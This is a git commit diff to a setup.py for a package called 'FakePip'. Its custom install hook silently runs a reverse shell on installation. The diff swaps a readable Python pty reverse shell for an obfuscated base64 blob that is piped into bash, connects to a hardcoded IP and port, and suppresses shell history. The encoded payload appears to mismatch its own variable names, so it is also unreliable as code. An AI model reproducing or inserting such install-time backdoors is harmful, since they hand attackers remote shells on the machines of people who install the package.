ba77172fddde73f6f3b07d65d1e12215032bebc9
cannysiska <38238774+cannysiska@users.noreply.github.com>
2019-02-18 20:07:55 +0700

    am going to change this bc of raw link needed
    nothing, basically encode the reverse shell into base64 without further instruction

--- setup.py
+++ setup.py
@@ -1,18 +1,13 @@
 from setuptools import setup
 from setuptools.command.install import install
-import base64
+#import base64
 import os
 
 
 class CustomInstall(install):
   def run(self):
     install.run(self)
-    LHOST = 'localhost'  # change this
-    LPORT = 13372
-    
-    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
-    encoded = base64.b64encode(reverse_shell)
-    os.system('echo %s|base64 -d|bash' % encoded)
+    os.system('echo cHl0aG9uIC1jICJpbXBvcnQgb3MscHR5LHNvY2tldDsgTEhPU1QgPSAnMTAuMTI0LjE5Ni4xMjYnOyBMUE9SVCA9IDEyMzQ1OyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgobGhvc3QsbHBvcnQpKTsgb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTsgb3MucHV0ZW52KCdISVNURklMRScsICcvZGV2L251bGwnKTsgcHR5LnNwYXduKCcvYmluL2Jhc2gnKTsgcy5jbG9zZSgpOyIg|base64 -d|bash')
 
 
 setup(name='FakePip',
